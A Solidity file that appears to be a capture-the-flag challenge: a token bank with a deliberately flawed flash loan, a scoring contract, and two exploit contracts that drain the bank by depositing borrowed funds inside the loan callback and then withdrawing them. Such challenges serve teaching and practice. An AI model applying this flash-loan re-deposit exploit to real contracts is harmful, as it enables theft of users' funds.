//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract ERC20 is IERC20 {

    string public constant name = "ERC20";
    string public constant symbol = "ERC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) balances;

    mapping(address => mapping (address => uint256)) allowed;

    uint256 totalSupply_ = 1000 ether;


   constructor() {
    balances[msg.sender] = totalSupply_;
    }

    function totalSupply() public override view returns (uint256) {
    return totalSupply_;
    }

    function balanceOf(address tokenOwner) public override view returns (uint256) {
        return balances[tokenOwner];
    }

    function transfer(address receiver, uint256 numTokens) public override returns (bool) {
        require(numTokens <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender]-numTokens;
        balances[receiver] = balances[receiver]+numTokens;
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }

    function approve(address delegate, uint256 numTokens) public override returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public override view returns (uint) {
        return allowed[owner][delegate];
    }

    function approveCall(address target,uint256 amount,bytes calldata data)external  {
        allowed[msg.sender][target] = amount;
        (bool success,bytes memory returnData) = target.call(data);
        require(success,string(returnData));

    }

    function transferFrom(address owner, address buyer, uint256 numTokens) public override returns (bool) {
        require(numTokens <= balances[owner]);
        require(numTokens <= allowed[owner][msg.sender]);

        balances[owner] = balances[owner]-numTokens;
        allowed[owner][msg.sender] = allowed[owner][msg.sender]-numTokens;
        balances[buyer] = balances[buyer]+numTokens;
        emit Transfer(owner, buyer, numTokens);
        return true;
    }

}
// 1.合约攻击。2.合约token余额归零。
contract loanbank{
    ERC20 public token = new ERC20();
    bool isAir;
    bool lock;
    mapping(address => uint256) public bankBal;

    function deposit(uint256 amount)public{
        require(token.transferFrom(msg.sender,address(this),amount));
        bankBal[msg.sender]+=amount;
    }

    function withdraw(uint256 amount)public{
        require(bankBal[msg.sender]>=amount);
        token.transfer(msg.sender,amount);
        bankBal[msg.sender]-=amount;
    }

    function airdrop()public{   
        require(!isAir);
        isAir=true;
        token.transfer(msg.sender,0.1 ether);
    }

    function flashLoan(uint256 borrowAmount, bytes calldata data)
        external
    {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        lock = true;
        token.transfer(msg.sender, borrowAmount);
        msg.sender.call(data);
        lock=false;
        uint256 balanceAfter = token.balanceOf(address(this));
        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }

}

contract attract{
    check che;
    ERC20 erc20;
    constructor(check addr) public {
        che = addr;
        erc20 = che.token();
    }
    function depositToken() public {
        che.deposit(1000 ether);
    }
    function att() public {
        erc20.approve(address(che),1000 ether);
        che.flashLoan(1000 ether,abi.encodeWithSignature("depositToken()"));
        che.withdraw(1000 ether);
        che.isCompleted();
    }
}


contract check is loanbank{
    uint256 public score;
    function isCompleted()public{
        require(!lock);
        if (tx.origin != msg.sender){
            score+=25;
        }

        if (token.balanceOf(address(this))==0){
            score+=75;
        }
    }
}
contract att{
    check che;
    ERC20 erc;
    constructor(check addr) public{
        che = addr;
        erc = che.token();
    }
    function dep() public{
        che.deposit(1000 ether);
    }
    function attract() public{
        che.airdrop();
        erc.approve(address(che),1000 ether);
        che.flashLoan(999.9 ether,abi.encodeWithSignature("dep()"));
        che.withdraw(1000 ether);
        che.isCompleted();
    }
}